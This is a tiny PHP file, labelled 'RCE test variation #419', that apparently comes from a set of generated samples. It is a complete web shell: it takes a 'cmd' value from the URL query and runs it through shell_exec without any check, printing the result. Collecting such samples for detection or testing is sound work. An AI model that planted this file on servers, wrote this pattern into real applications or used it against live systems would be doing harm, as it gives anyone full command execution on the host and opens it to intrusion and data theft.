<?php
// RCE test variation #419
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>